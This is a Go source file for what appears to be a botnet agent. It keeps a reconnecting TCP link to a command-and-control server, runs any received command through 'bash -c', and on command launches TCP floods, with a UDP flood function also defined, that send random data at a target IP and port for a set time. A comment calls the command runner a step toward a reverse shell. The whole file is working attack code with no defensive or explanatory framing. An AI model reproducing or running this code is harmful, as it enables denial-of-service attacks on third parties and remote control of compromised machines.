package main

import (
	"crypto/rand"
	"errors"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func main() {
	//Connect to the server
	serverAddr := "192.168.1.65:8080"
	var conn net.Conn

	for {
		if conn == nil { //This makes sure to reconnect if the connection falls
			//tries to connect
			newConn, err := net.Dial("tcp", serverAddr)
			if err != nil {
				fmt.Println("Error connecting to the server:", err)
				time.Sleep(time.Second) // Wait before attempting to reconnect
				continue
			}
			fmt.Println("Connected to the server")
			conn = newConn

			go func() {
				defer conn.Close()

				buffer := make([]byte, 1024)

				for {
					n, err := conn.Read(buffer)
					if err != nil {
						fmt.Println("Error receiving data:", err)
						conn = nil // Set conn to nil to trigger reconnection
						break      // Exit the goroutine on error
					}

					receivedData := string(buffer[:n])
					parameters := strings.Split(receivedData, " ")

					//parameters = [type,ip, port, secs, size]
					switch parameters[0] {
					case "tcp":
						fmt.Println(parameters)

						if len(parameters) < 5 {
							continue
						}
						secs, err := strconv.ParseUint(parameters[3], 10, 64)
						size, err := strconv.ParseUint(parameters[4], 10, 64)

						if err != nil {
							fmt.Println("Error executing command:", err)
							continue
						} else {
							tcp_attack(parameters[1], parameters[2], secs, size)
						}

					default:
						fmt.Println("Received from server:", receivedData)
						output, err := executeCommand(receivedData)

						if err != nil {
							fmt.Println("Error executing command:", err)
							continue
						}
						fmt.Println("Command executed:\n", output)
					}

				}
			}()
		}

		// Add a short delay before attempting to reconnect
		time.Sleep(time.Second)
	}
}

// Executes in the cmd the message sent vy the server
// Not reverseShell but we are getting there
func executeCommand(code string) (string, error) {
	cmd := exec.Command("bash", "-c", code)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}

	return string(output), nil
}

func validateAttackParameters([]string) error {
	return errors.New("Something went wrong")
}

func tcp_attack(ip string, port string, secs uint64, size uint64) {
	defer fmt.Printf("Attack on %v done\n", ip)

	duration := time.Duration(secs) * time.Second // Set the desired duration (e.g., 5 seconds)
	startTime := time.Now()                       // Get the current time
	serverAddr := ip + ":" + port
	fmt.Printf(serverAddr)

	// Run a loop for the specified duration
	for time.Since(startTime) < duration {
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		defer conn.Close()

		for time.Since(startTime) < duration {

			//Send random data bytes to the target
			randomData := make([]byte, size)
			_, err := rand.Read(randomData)

			if err != nil {
				fmt.Println("Error generating random data:", err)
				return
			}
			//fmt.Println(randomData)
			//Writes the message as a byte slice to the server connection using the conn.Write method. The underscore (_) is used to ignore the number of bytes written (since it's not used).
			_, err = conn.Write([]byte(randomData))
			if err != nil {
				fmt.Println("Error sending data:", err)
				return
			}
		}
	}

}

func udp_attack(ip string, port string, secs uint64, size uint64) {
	defer fmt.Printf("Attack on %v done\n", ip)

	duration := time.Duration(secs) * time.Second // Set the desired duration (e.g., 5 seconds)
	startTime := time.Now()                       // Get the current time
	serverAddr := ip + ":" + port
	fmt.Println(serverAddr)

	// Run a loop for the specified duration
	for time.Since(startTime) < duration {

		// Resolve the UDP server address
		udpAddr, err := net.ResolveUDPAddr("udp", serverAddr)

		if err != nil {
			fmt.Println("Error resolving address:", err)
			return
		}

		conn, err := net.DialUDP("udp", nil, udpAddr)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		defer conn.Close()

		for time.Since(startTime) < duration {
			//Send random data bytes to the target
			randomData := make([]byte, size)
			_, err := rand.Read(randomData)

			if err != nil {
				fmt.Println("Error generating random data:", err)
				return
			}
			_, err = conn.Write(randomData)
			if err != nil {
				fmt.Println("Error sending data:", err)
				return
			}
		}
	}
}
